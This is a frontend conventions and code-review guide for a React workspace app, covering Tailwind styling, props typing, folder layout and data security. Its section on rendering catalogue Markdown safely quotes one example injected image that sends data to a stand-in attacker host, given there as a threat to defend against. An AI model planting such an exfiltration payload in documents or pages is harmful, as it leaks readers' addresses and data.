# Frontend conventions

These conventions adapt the Dopamint Arena frontend rules to Hub William’s React
Router Framework SPA layout. Where the two differ, this file governs here.

Two differences from the upstream rules are load-bearing and worth stating up front:

- source lives under `src/`, not `app/`, so every `app/…` path in the upstream
  doc maps onto `src/…` here;
- **this app contains real `<form>` elements**, which the upstream package does
  not. The attribute rules below depend on that, so do not copy the upstream
  wording about `type="button"` verbatim.

Hub William is now the agent-workspace product: a specification page, a canvas
catalogue of harnesses/skills/hooks, and agent activity telemetry. The provider
dashboard it replaced is gone, and so are the rules that only described it.

Treat everything below as review criteria, not style suggestions. Review every
changed file against it before handing work off.

## Core principles

- Keep the UI fully responsive from 320px upward. Interactive controls need an accessible name, visible focus, and a practical touch target.
- Use semantic HTML and purposeful ARIA. Do not use generic inline elements when a paragraph, label, time, strong, or other semantic element fits.
- ARIA state attributes belong on the element that owns the state. `aria-disabled` is meaningful on a widget, not on a `section`; gate a step by rendering no body rather than by dimming it.
- Use `interface` for object shapes and component props. Reserve `type` for unions, literal unions, tuples, and utility compositions — anything that cannot be expressed as an interface.
- Group state that changes together into one cohesive object.
- Remote schemas are authoritative. Do not silently invent fallback fields when provider or database contracts are unclear.
- Mirror database nullability in row types. A `not null default '{}'` column is not optional in TypeScript.
- Dependencies need real consumers. Remove packages that are not used by the shipped app.

## Declare props as a named interface

Always declare component props as a named interface, even when the component
takes one prop. Never put an inline object type in a parameter.

```tsx
interface SnippetProps {
  children: ReactNode;
  value: string;
}

function Snippet({ children, value }: SnippetProps) { … }
```

Do not write `function Snippet({ value }: { value: string })`.

The same rule applies to hooks, helpers, and callback types — an options bag is
an options bag whoever receives it. Name the interface after the function plus
what the parameter is called, so the two read together at the call site:

| Parameter          | Interface                       |
| ------------------ | ------------------------------- |
| component props    | `<ComponentName>Props`          |
| `opts` / `options` | `<FunctionName>Options`         |
| `args`             | `<FunctionName>Args`            |
| anything else      | `<FunctionName><ParameterName>` |

Export it only when something outside the file needs it.

## Styling

- Tailwind is the default styling language.
- **Express variants with `tailwind-variants`.** Define tables once at module
  scope — calling `tv()` in a render body rebuilds the config every frame.
- Reach for `tv` in exactly three cases:
  1. **A variant switches it** — `hourBar({ peak })`, `stepSection({ locked })`.
  2. **The component merges a caller’s `className`** — pass it through the
     `className` slot so tailwind-merge runs over the whole set.
  3. **It composes with a variable** — `usageFigure({ className: percentageTone(n) })`.
- Static, single-use, no variant? Write the literal inline. A frozen string has
  nothing to merge and nothing to switch.
- **Never assemble classes with a template literal or a bare ternary.** Both skip
  the tailwind-merge pass, so a caller’s `text-xs` wins or loses on stylesheet
  order rather than on intent.

  | Do not write                                 | Write instead              |
  | -------------------------------------------- | -------------------------- |
  | ``className={`size-2 ${tone}`}``             | `dot({ className: tone })` |
  | `className={active ? "h-full" : "min-h-50"}` | `card({ active })`         |

- **`slots` is for parts that share a variant.** When one flag drives several
  elements, name them as slots on a single `tv` so the state reads in one place —
  `coverageTone` in `_app.jobs/source-coverage.tsx` does this because the glyph
  and the badge read the same flag. A part with its own independent flag gets its
  own table.
- Prefer the shared layout primitive `Flex` when it makes repeated intent clearer.
- **Preserve the graphite-paper theme.** The workspace is light only: a
  near-white `#fafbfc` page, zinc for every surface and every word, and indigo
  reserved for the one thing worth acting on. `--primary` is near-black on
  purpose — the specification's own buttons are ink, and an indigo button beside
  an indigo link makes neither mean anything. Emerald and amber are domain
  signals (backend, hooks), not accents to reach for.
- **There is no dark mode.** `root.tsx` sets no `dark` class and
  `@custom-variant dark (&:is(.dark *))` pins `dark:` to a class the app never
  sets, so the `dark:` utilities inside the generated shadcn primitives stay
  inert. Deleting that line would hand them to `prefers-color-scheme` and paint
  half the app dark against light tokens.
- Keep motion restrained. `src/styles/root/root-index.css` neutralises animation
  and transition durations globally under `prefers-reduced-motion: reduce`; do
  not reintroduce per-class exceptions.
- Disabled state must exist in the DOM, not only in paint. `pointer-events-none`
  stops a mouse but leaves a control tabbable — use `disabled`, or do not render
  the control.

### Rendering a catalogue document is a security decision

The catalogue publishes Markdown that arrives by pull request from whoever wants
an entry in it, so **every byte of a document body is treated as authored by a
stranger.** Review is the first control; it is not the last, because a reviewer
reading a diff of a 400-line contract is looking at prose, not at an injection
three screens down. `src/components/markdown/` is the only supported way to
render one.

Four rules keep it safe, and each is one line away from being undone:

- **Never add `rehype-raw`.** It is the single switch that turns escaped text
  back into live HTML.
- **Never override `urlTransform`.** react-markdown's default is what strips
  `javascript:` and `data:` from `href` and `src`.
- **Never pass a `components` override that calls `dangerouslySetInnerHTML`.**
- **Never add `img` to `markdown-schema.ts`.** With no JavaScript at all, an
  injected `![](https://evil.tld/p.png?q=…)` fires a request the moment anyone
  opens the page, leaking their address and whatever the injection persuaded the
  author to put in the path. Links cannot be dropped — they are half the point
  of a contract — so each one is annotated with the host it actually points at.

`h1` is absent for a different reason: the sheet prints the entry's name as its
heading, and the service strips the document's own title line so it is not
rendered twice.

Do not reach for DOMPurify. In a browser it is correct; constructed against
`linkedom` in Deno it reports `isSupported: undefined` and returns its input
unchanged, with no error. It fails open. `rehype-sanitize` works on the tree and
needs no DOM.

`vercel.json` carries a CSP as the backstop, and it still matters. `script-src` has to include
`'unsafe-inline'` because React Router's SPA build inlines its hydration
bootstrap into `index.html`; the directives that do the work here are
`img-src 'self' data:`, which blocks an exfiltration pixel, and `connect-src`,
which bounds where anything could be sent. `font-src 'self' data:` is why the
two typefaces are self-hosted through `@fontsource-variable/*` rather than
linked from Google Fonts — a `<link>` to a font CDN is refused by the browser,
silently, leaving the fallback stack on screen.

**`connect-src` names the project host, not `*.supabase.co`.** The wildcard
would admit every Supabase project on the internet, including a free-tier one an
attacker registers whose REST endpoint happily accepts posted data — which is
the exfiltration channel `img-src` was tightened to close. A fork has to change
that host along with `VITE_SUPABASE_URL`.

### `cn` is for shadcn primitives only

`src/components/ui/` is **generated output**. `shadcn add` rewrites those files
wholesale from `components.json`, so hand-composing them with `tv` would be
undone by the next run. They keep `cn`/`cva`, and that is deliberate — the same
reasoning that exempts any codegen from hand-editing.

`cn` therefore lives in `src/utils/utils.class-names.ts`, and
`components.json`’s `aliases.utils` points at that exact path so a regenerated
primitive imports something that exists. **Application code outside
`src/components/ui/` must not call `cn`** — use `tv`.

## Write Tailwind v4, and write it canonically

Several v3 spellings still compile, so the build will not tell you when one slips
in. These are review criteria, not build errors.

- **Important goes at the end** — `px-4!`, not `!px-4`.
- **`outline-hidden`, not `outline-none`, when suppressing a focus ring.**
  `outline-none` removes the outline outright; `outline-hidden` keeps an
  invisible one so forced-colors mode still shows focus.
- **Collapse a pair into its canonical single class** — `size-full` not
  `h-full w-full`, `size-8` not `h-8 w-8`, `px-2` not `pl-2 pr-2`, `inset-0` not
  four sides. Two classes holding one intent drift the moment someone edits half.
- **An arbitrary value that lands on the scale is not arbitrary.** `--spacing` is
  `0.25rem`, so a px value divisible by 4 and a rem value divisible by 0.25 both
  have a canonical name: `max-h-112` not `max-h-[28rem]`, `min-h-75` not
  `min-h-[300px]`, `border-14` not `border-[14px]`.
- Values off the scale stay in brackets and are **not** a smell: `text-[11px]`,
  `text-[0.68rem]`, `gap-[3px]`, and every `clamp()` have no canonical form.
- **Check before converting — the build is the authority.** Run `pnpm build` and
  grep the emitted CSS rather than trusting arithmetic.
- **Do not "fix" the size scale by name.** v4 shifted it (v3’s `shadow-sm` is v4’s
  `shadow-xs`, and the same applies to `rounded` and `blur`). Renaming these
  changes the design.
- Tailwind scans source for complete class names, so a class assembled at runtime
  is never generated. Spell out each variant value in full.

## Add attributes only when they work

Prefer native semantic elements and the existing primitives. Do not add `type`,
`aria-*`, `id`, `role`, `title`, or `data-*` by habit. Each one needs a concrete
behaviour, relationship, test, tooltip, or accessibility consumer that the
element does not already provide.

- **Every non-submit `<button>` declares `type="button"`.** This is the one place
  the upstream rule is inverted, and the inversion is situational rather than a
  matter of taste. A native `<button>` defaults to `submit` when it belongs to a
  form; the upstream package contains no `<form>` at all, so there the attribute
  is genuinely dead weight. **This app has two forms** (`_auth.login` and
  `_auth.register`), and its buttons live in sheets, canvases and toolbars that
  are composed into parents they cannot see. Deciding per-site means the answer silently changes the day someone
  wraps a subtree in a `<form>`, and the failure mode is an accidental submit
  with no error anywhere. The canvas makes this sharper, not softer: every card
  on `/library` is a `<button>`. Declaring it is cheap and stable; auditing ancestry on
  every refactor is not. The submit control itself takes `type="submit"`, and
  every meaningful `<input type>` stays — it selects a real browser control,
  keyboard, and validation behaviour.
- **`data-*` needs a reader.** `data-slot="chart"` earns its place because the
  chart tests query it; `data-slot` in `src/components/ui/` earns its place
  because those components’ own selectors match on it. An attribute inherited
  from a generator is not automatically earned once the generator is gone.
- **Do not state the same thing twice.** A control whose visible label already
  changes with state does not also need `aria-pressed` repeating it.
- **Every `aria-labelledby` must resolve.** A reference to an id that is never
  rendered leaves the element with no accessible name at all — worse than
  omitting the attribute. Each top-level route section pairs its
  `aria-labelledby` with an `sr-only` `<h2>` carrying that id.
- Removing an attribute is not mechanical. Search outside the component for
  consumers — `querySelector`, attribute selectors, `getByTitle`, direct DOM
  reads — and either migrate the consumer in the same change or keep it.
  `aria-hidden="true"` on a decorative icon is doing its job.

## Ownership and folders

```text
src/
  assets/                      # static images imported by the app
  components/
    ui/                        # generated shadcn primitives — see "cn" above
    markdown/                  # the only supported way to render a document
    flex.tsx                   # reusable application primitives, flat
    copy-command.tsx
    page-header.tsx
    workspace-loading.tsx
  routes/
    _auth/route.tsx            # pathless authentication layout
    _auth.login/route.tsx      # /login
    _auth.register/route.tsx   # /register
    _app/                      # pathless workspace layout — open, not gated
      route.tsx
      workspace-shell.tsx
      workspace-session.ts     # the prototype sign-in shared through Outlet context
    _app._index/               # / the specification, and its private modules
      route.tsx
    _app.library/              # /library canvas, and its private modules
      route.tsx
      canvas-geometry.ts       # every position on the artboard, in canvas units
    _app.activities/           # /activities telemetry, and its private modules
      route.tsx
    $.tsx                      # catch-all route
  root.tsx                     # document shell and global providers
  routes.ts                    # file-route configuration
  providers/                   # app context providers
  services/                    # remote/local data transport and normalization
    activities/                # fixture telemetry
    auth/                      # Supabase account access, used by /login and /register
    catalog/                   # machine/catalog/**/*.md, parsed at build time
    supabase/
  styles/
    library/library-index.ts   # the area and category colour tables
    root/root-index.css        # the theme; src/root.tsx imports this
  test/                        # shared test setup
  utils/                       # focused pure helpers, one concern per file

supabase/
  functions/
    _shared/                   # transport, crypto, database access, provider types
      providers/               # one module per provider integration
    provider-connections/      # connect, poll, reconnect, disconnect
    provider-sync/             # scheduled and manual refresh
  migrations/                  # version-controlled SQL
```

- **The catalogue is `machine/catalog/`, and there is no backend behind it.**
  `services/catalog` inlines every `.md` under that folder with
  `import.meta.glob(..., { query: "?raw", eager: true })`, so the published
  catalogue is exactly what the repository contains and a contribution is a pull
  request that adds one more file. Nothing fetches at runtime and nothing is
  uploaded anywhere.
- **The catalogue service never edits its sources.** Those files are live machine
  contracts that agents read as instructions; adding front matter to make a
  listing prettier would be editing an instruction to suit a page. Category and
  area come from the path, name and description from the document's own first
  heading and paragraph, and front matter is honoured only where the format
  already has it — a skill's `name` and `description`.
- **Telemetry on `/activities` is still fixture data** behind
  `services/activities`, so the day it becomes rows only the service changes.
- **The workspace layout is open.** `_app/route.tsx` used to redirect anyone
  without an approved profile to `/login`; the pages under it now hold a public
  specification, a public catalogue and fixture telemetry, so it does not. The
  sign-in on `/activities` is prototype state on the layout — real accounts still
  live at `/login` and `/register`. Restore the guard the moment a page under it
  reads somebody's data.

- Route modules and route-only UI belong in `src/routes`. A route folder exposes `route.tsx`; its charts, dialogs, tables, and tests stay beside it.
- Use React Router file naming for URL and layout relationships. A leading underscore creates a pathless layout, dots create nesting, `_index` defines an index route, and `$` defines the catch-all route.
- Keep `src/components` for UI reused by multiple routes. A component used by exactly one route belongs to that route’s folder; promote it when a second route needs it, not before. A component with no importers is deleted, not kept for later.
- **Filenames are kebab-case, and a component family stays flat until it reaches three or more files.** Below that, flat siblings read better than a folder holding two things. Past it, group into a folder named for the family with the entry point at `index.tsx`, and keep the family prefix on each child filename so a dozen open `index` tabs stay legible.
- Route-local modules use descriptive kebab-case filenames without repeating the route name, for example `recent-usage-chart.tsx`.
- Import across ownership boundaries with `@/`. Use `./` only inside the same owner folder. Any `../` import is migration debt — replace it when you next touch the file.
- **`src/utils/` holds focused pure helpers, one concern per `utils.*.ts` file** — `utils.class-names.ts`, `utils.format.ts`. There is no `src/utils/index.ts`, and there is no `src/lib`.
- A class table or stylesheet that **more than one file reads** belongs in `src/styles/<folder>/`, with files carrying the folder’s name as a prefix and `<folder>-index.*` as the entry. A table only one component uses stays in that component, at module scope.
- Components never make raw network calls. Services own Supabase transport; Edge Functions own provider transport.
- Do not create a catch-all `types/` directory. Keep types with the service or feature that owns them. `supabase/functions/_shared/provider-types.ts` is the one shared contract module and stays limited to types crossing function boundaries.

## Exports

- Use default exports for feature pages, providers, services, and main module surfaces.
- Utility modules use named exports for their helpers — `cn`, `formatCurrency`, `formatTokens`.
- Avoid broad barrel files that hide ownership or introduce circular imports.

## Data and security

- Treat all Vite client code and `VITE_` variables as public.
- The Supabase publishable key is acceptable in the client only with correct Auth and RLS policies.
- New profiles default to `pending` and `member`; only the owner changes them to `approved` or to another role in Supabase.
- `status` gates the workspace, `role` gates what can be done inside it. Keep them separate: approval is not seniority.
- A role check in the UI decides what to draw, never what is allowed. Anything an `admin` alone may do is refused again in the Edge Function and in the database function that would write it.
- Route guards improve navigation, but database RLS remains the authorization boundary.
- Never store the text of a prompt. Counts, lengths, timings, and slash command names are facts about a prompt; its content is whatever was pasted at a terminal, and a column holding it outlives every backup.
- Never expose provider secrets, service-role credentials, passwords, browser cookies, or session tokens.
- The only connection flow is the ChatGPT device-code authorization. The browser never receives a provider token: it starts and polls the flow through `provider-connections`, and every token exchange, refresh, and revocation happens inside an Edge Function.
- Encrypt provider credentials with AES-GCM before writing them to the `private` schema, which has no browser grants. Keep the encryption key in Edge Function secrets.
- Persist a rotated refresh token the moment it is issued, not at the end of a successful sync. The provider invalidates the presented token on rotation.
- Keep unresolvable agent activity unassigned; never guess account attribution.

## Tests and verification

- Colocate tests with top-level hooks, providers, utilities, and services.
- Test normalization and aggregation at service boundaries.
- Add focused component tests for meaningful interaction or accessibility behavior. Route-local tests live beside the module they cover.
- Before handoff, run formatting, lint, type checking, unit tests, and a production build.

```bash
pnpm format
pnpm lint
pnpm typecheck   # tsc -b for src, then typecheck:functions for supabase/functions
pnpm test
pnpm build
```

- **`src` compiles under `strict`.** `tsconfig.app.json` sets `strict` and
  `noImplicitOverride`; both were free to turn on, so keep them green rather than
  reaching for a `// @ts-expect-error`. Three further flags are _not_ enabled
  because they are not free — if you want one, budget the cleanup:
  `exactOptionalPropertyTypes` (11 errors), `noPropertyAccessFromIndexSignature`
  (18), `noUncheckedIndexedAccess` (68).
- **`tsc -b` is incremental.** When a result looks too clean to believe, re-run it
  as `tsc -b --force`, or delete `node_modules/.tmp`. The cheapest way to trust a
  green typecheck is to break something on purpose and confirm it goes red.

- `pnpm typecheck` covers both projects: `tsc -b` for `src`, then
  `typecheck:functions` for `supabase/functions`. Edge Functions run on Deno, so
  they have their own `tsconfig.json` and a minimal `deno.d.ts` for the two Deno
  globals in use — keep that file minimal rather than growing a fake runtime.
- **CI runs `pnpm lint` only** (`.github/workflows/vercel-deploy.yml`), and a
  push to `main`, `staging`, or `dev` deploys. A green pipeline is therefore not
  evidence that the tests pass — run them locally before merging.
